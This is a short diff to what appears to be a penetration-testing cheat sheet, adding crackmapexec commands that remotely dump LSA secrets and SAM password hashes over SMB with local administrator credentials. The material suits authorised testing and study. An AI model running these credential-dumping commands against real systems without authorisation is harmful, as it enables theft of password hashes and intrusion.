@@ -43,3 +43,11 @@ The `-x` flag can be used to execute a command too
 ```sh
 crackmapexec smb [ip] -u [user] -p [pass] --shares
 ```
+
+### Extracting Hashes from SAM Database
+**Remote dumping** of the LSA secrets & SAM databases can also be done via tools like `crackmapexec` using a local administrator account:
+```sh
+$ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --lsa
+
+$ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --sam
+```
